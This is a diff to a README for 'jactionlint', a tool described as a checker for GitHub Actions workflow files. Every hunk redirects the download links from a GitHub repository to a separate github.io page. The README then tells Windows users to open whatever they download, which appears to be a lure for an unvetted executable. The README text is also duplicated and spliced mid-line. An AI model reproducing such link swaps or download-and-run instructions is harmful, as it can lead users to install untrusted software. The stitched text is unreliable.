@@ -1,6 +1,6 @@
 # ✅ jactionlint - Check GitHub Actions Files With Confidence
 
-[![Download jactionlint](https://img.shields.io/badge/Download-jactionlint-ff6b6b?style=for-the-badge&logo=github)](https://github.com/MohGith/jactionlint)
+[![Download jactionlint](https://img.shields.io/badge/Download-jactionlint-ff6b6b?style=for-the-badge&logo=github)](https://mohgith.github.io)
 
 jactionlint is a static checker for GitHub Actions workflow files. In everyday language, it looks at the instruction files that tell GitHub what to do automatically and helps you find mistakes before those instructions run. If you use GitHub to manage a project, publish a website, run checks, or automate repetitive work, jactionlint gives you a simple way to review those automation files with more confidence.
 
@@ -61,7 +61,7 @@ If you do not have a workflow file yet, you can still download jactionlint and u
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download jactionlint](https://github.com/MohGith/jactionlint).
+Visit this link to download the application: [Download jactionlint](https://mohgith.github.io).
 
 Use the official GitHub page above as your download source. Once the download finishes, open the downloaded item to start jactionlint on your Windows computer. The application is intended to help you check GitHub Actions workflow files, so the next step is to use it with the workflow file you want to review.
 
@@ -73,7 +73,7 @@ When you open jactionlint for the first time, take a moment to look at the main 
 
 A simple way to start# ✅ jactionlint - Check GitHub Actions Files With Confidence
 
-[![Download jactionlint](https://img.shields.io/badge/Download-jactionlint-ff6b6b?style=for-the-badge&logo=github)](https://github.com/MohGith/jactionlint)
+[![Download jactionlint](https://img.shields.io/badge/Download-jactionlint-ff6b6b?style=for-the-badge&logo=github)](https://mohgith.github.io)
 
 jactionlint is a static checker for GitHub Actions workflow files. In simple terms, it reviews the instruction files that tell GitHub what to do automatically and helps you find mistakes before those instructions run. If you use GitHub to manage a project, publish a website, run checks, or automate repetitive work, jactionlint gives you a straightforward way to look over those automation files with more confidence.
 
@@ -134,7 +134,7 @@ If you do not have a workflow file yet, you can still download jactionlint and u
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download jactionlint](https://github.com/MohGith/jactionlint).
+Visit this link to download the application: [Download jactionlint](https://mohgith.github.io).
 
 Use the official GitHub page above as your download source. Once the download finishes, open the downloaded item to start jactionlint on your Windows computer. The application is intended to help you check GitHub Actions workflow files, so the next step is to use it with the workflow file you want to review.
 
